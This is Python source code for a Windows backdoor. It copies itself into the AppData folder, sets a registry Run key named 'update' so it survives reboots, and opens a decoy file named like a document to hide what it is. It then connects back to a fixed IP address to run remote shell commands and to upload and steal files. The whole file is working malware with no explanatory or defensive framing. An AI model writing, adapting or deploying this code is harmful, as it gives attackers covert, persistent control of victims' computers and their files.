#!/usr/bin/python
import socket
import json
import subprocess
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\gta.exe"
        if not os.path.exists(evil_file_location):
            shutil.copy(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            data = self.connection.recv(1024)
            json_data += data
            try:
                return json.loads(json_data.decode())
            except json.JSONDecodeError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, text=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            file_content = file.read()
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            return encoded_content

    def write_file(self, path, content):
        decoded_content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(decoded_content)
            return "[+] Upload successful."

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
                
            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)
file_name = sys._MEIPASS + "\\Mouse.docx.pdf"
subprocess.Popen(file_name, shell =True)
try:
    my_backdoor = Backdoor("192.168.0.103", 80)
    my_backdoor.run()
except Exception:
    sys.exit()
